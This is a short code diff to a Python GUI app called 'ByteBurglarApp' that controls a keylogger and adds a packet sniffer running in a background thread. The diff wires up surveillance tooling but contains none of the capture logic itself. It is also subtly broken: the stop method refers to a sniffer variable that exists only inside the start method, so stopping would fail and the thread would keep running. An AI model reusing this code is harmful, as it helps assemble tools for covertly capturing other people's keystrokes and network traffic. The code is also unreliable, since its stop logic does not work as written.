@@ -1,5 +1,7 @@
 import customtkinter as ctk
+import threading
 from Keylogger.client import KeyloggerThread
+from PythonSecurity.packet_sniffer import PacketSniffer
 
 BUTTON_START_KEYLOGGER_TEXT = 'Start keylogger'
 BUTTON_STOP_KEYLOGGER_TEXT = 'Stop keylogger'
@@ -54,9 +56,13 @@ class ByteBurglarApp:
 
     def activate_packet_sniffer(self):
         print("Packet sniffer activated!")
+        packet_sniffer = PacketSniffer()
+        listener_thread = threading.Thread(target=packet_sniffer.run)
+        listener_thread.start()
 
     def deactivate_packet_sniffer(self):
         print('Deactivating packet sniffer')
+        packet_sniffer.stop()
 
     def update_textbox(self, data):
         self.text.configure(state='normal')  # Enable the textbox
